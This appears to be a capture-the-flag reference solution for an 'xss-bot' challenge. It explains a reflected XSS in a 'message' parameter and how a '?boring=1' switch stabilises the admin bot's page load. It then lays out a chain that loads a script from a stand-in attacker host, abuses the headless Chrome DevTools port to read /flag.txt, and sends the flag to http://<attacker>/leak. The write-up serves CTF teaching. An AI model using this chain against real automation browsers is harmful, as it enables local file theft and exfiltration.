# xss-bot — reference solution

## Summary

The admin bot visits a URL you submit, using a headless Chromium launched with
`--disable-web-security` and a **fixed, localhost-only CDP (DevTools) port**
(`--remote-debugging-port=9222`), where **only `http://localhost:8080` is
allowed to open CDP WebSocket connections** (`--remote-allow-origins`). The
flag lives on disk at `/flag.txt`.

`file:///flag.txt` cannot be read from an `http` page (Chrome blocks
`file://` loads from `http` contexts even with web security off — iframes,
popups and `<object>` all become `about:blank#blocked`). The way in is the
browser's own CDP port, which can open a `file://` tab and read it. But a
page can only open a CDP WebSocket if its origin is `http://localhost:8080`,
so the exploit must run **same-origin on the app itself**.

## Vulnerability

`GET /` reflects the `message` query parameter unescaped into the status
header:

```js
const message = req.query.message != null ? String(req.query.message) : DEFAULT_MESSAGE;
res.type("html").send(render(req, headers(message), BOT_FORM));
// messageHeader -> `... STATUS: ${message} ...`
```

So `GET /?message=<script src=...></script>` is **reflected XSS** that runs at
origin `http://localhost:8080` — exactly the origin the CDP allow-list trusts.

## The `boring` switch

By default `/` renders the full cursed STONKS page: a 32&nbsp;MB background
video, six audio tracks and a pile of multi-MB GIFs. With
`waitUntil: "networkidle2"` and a 15&nbsp;s navigation timeout, the bot's
`page.goto` never settles before it times out, and the post-load dwell that
gives the payload time to run is skipped — the exploit is flaky at best.

Appending `?boring=1` renders a stripped page with no media and no scripts of
its own, so the navigation settles instantly, the dwell runs, and the injected
script has a clean window to finish. The sink (`message`) is reflected in
boring mode too, so the solve uses **both** parameters together.

## Chain

1. Submit `http://localhost:8080/?boring=1&message=<script src=http://<attacker>/e.js></script>`
   to the bot.
2. The bot GETs it directly → reflected XSS runs at `http://localhost:8080`.
3. The injected script (`/e.js`):
   - `PUT http://localhost:9222/json/new?file:///flag.txt` — opens a tab on
     the flag file (readable cross-origin thanks to `--disable-web-security`).
   - connects that target's CDP WebSocket — allowed because the page origin is
     `http://localhost:8080`.
   - `Runtime.evaluate("document.body.innerText")` (retried until the file tab
     has rendered) → the flag.
4. The flag is sent to `http://<attacker>/leak`.

